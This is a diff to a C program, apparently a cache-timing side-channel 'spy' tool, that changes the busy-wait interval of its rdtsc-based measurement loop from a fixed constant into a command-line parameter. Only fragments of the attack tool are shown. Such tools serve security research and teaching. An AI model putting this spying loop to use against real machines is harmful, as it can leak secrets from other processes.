@@ -19,9 +19,6 @@
 // Number of time slots to record
 #define TIME_SLOTS 20000
 
-// How many cycles to busy wait
-#define BUSY_WAIT_CYCLES 2500
-
 #define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++)\
 
 static __inline__ unsigned long long rdtsc(void)
@@ -78,14 +75,15 @@ typedef struct {
     unsigned long result[MAX_NUM_OF_ADDRS];
 } time_slot;
 
-void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots) {
+void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
+        int busy_cycles) {
     unsigned long long clock = rdtsc();
     unsigned long long old_clock;
     for (size_t slot = 0; slot < num_slots; slot++) {
         old_clock = clock;
         clock = rdtsc();
-        while ((clock - old_clock) < BUSY_WAIT_CYCLES) {
-            busy_wait((BUSY_WAIT_CYCLES - (clock - old_clock)) / 50);
+        while ((clock - old_clock) < busy_cycles) {
+            busy_wait((busy_cycles - (clock - old_clock)) / 50);
             clock = rdtsc();
         }
         if (slot % 1000 == 0) {
@@ -160,7 +158,7 @@ int main(int argc, char *argv[]) {
     // ATTAAAAACK!
     printf("Started spying\n");
     time_slot slots[TIME_SLOTS];
-    spy(addrs, num_addrs, slots, TIME_SLOTS);
+    spy(addrs, num_addrs, slots, TIME_SLOTS, arguments.busy_cycles);
     printf("Finished spying\n");
 
     write_slots_to_file(num_addrs, slots, TIME_SLOTS, arguments.out_file);
